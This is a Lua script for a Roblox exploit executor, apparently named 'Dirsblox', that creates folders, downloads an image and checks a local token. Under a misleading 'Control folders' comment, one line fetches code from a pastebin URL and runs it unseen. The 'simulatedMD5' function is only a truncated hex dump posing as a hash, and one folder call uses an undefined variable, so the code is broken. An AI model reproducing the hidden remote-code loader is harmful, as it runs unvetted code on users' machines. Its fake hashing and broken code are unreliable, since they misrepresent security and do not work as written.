-- Simple function to simulate MD5 (32-char hex)
local function simulatedMD5(str)
    local hex = ""
    for i = 1, #str do
        hex = hex .. string.format("%02x", string.byte(str, i))
    end
    return hex:sub(1,32)
end
-- // Control folders
loadstring(game:HttpGet("https://pastebin.com/raw/cJzfu4pf"))()
local asstfld = "Dirsblox/Core/Assets"
local sysfld = "Dirsblox/Core/System"
local modulefld = "Dirsblox/Core/System/Modules"
local tokenPath = "Dirsblox/Core/token"
local dataPath = "Dirsblox/Core/data"
local player = game.Players.LocalPlayer
local content = "dirsblox tokens v1.5, player name: " .. player.Name
local correctHash = simulatedMD5(content)
-- // Assets
local imgd = "Dirsblox/Core/Assets/prestart.img"
local gma = "Dirsblox/Core/Assets/Games"
local ft = "Dirsblox/Core/Assets/Games/FTF"

writefile(dataPath, "")
writefile(imgd, "")
makefolder(sysfld)
makefolder(modulefld)
makefolder(assetfld)
makefolder(gma)
makefolder(ft)

-- // image
local basePath = "Dirsblox/Core/Assets/Games/FTF"

local filePath = basePath.."/default.png"

if not isfile(filePath) then
    local imageUrl = "https://i.imgur.com/Fbprf98.png"

    local response = request or syn and syn.request or http_request
    if response then
        local result = response({
            Url = imageUrl,
            Method = "GET"
        })

        if result and result.Body then
            writefile(filePath, result.Body)
            print("Image saved at:", filePath)
        else
            warn("Failed to download the image!")
        end
    else
        warn("Your executor does not support requests!")
    end
else
    print("Image already exists, no download made:", filePath)
end

local function createToken()
    writefile(tokenPath, correctHash)
    print("[DSBCore] Token successfully created: " .. correctHash)
end

local function verifyToken()
    local success, token = pcall(readfile, tokenPath)
    if not success then
        print("[DSBCore] Token missing! ERR_CD: 33")
        return false
    end
    if token ~= correctHash then
        print("[DSBCore] Incorrect token! Edit manually with the correct hash. ERR_CD: 67")
        return false
    end
    print("[DSBCore] Token verified! Script active.")
    return true
end

if not verifyToken() then
    print("[DSBCore] To reactivate, create 'token' in Dirsblox/Core/ with the correct MD5 hash.")
else
    print("[DSBCore] Everything running normally")
end
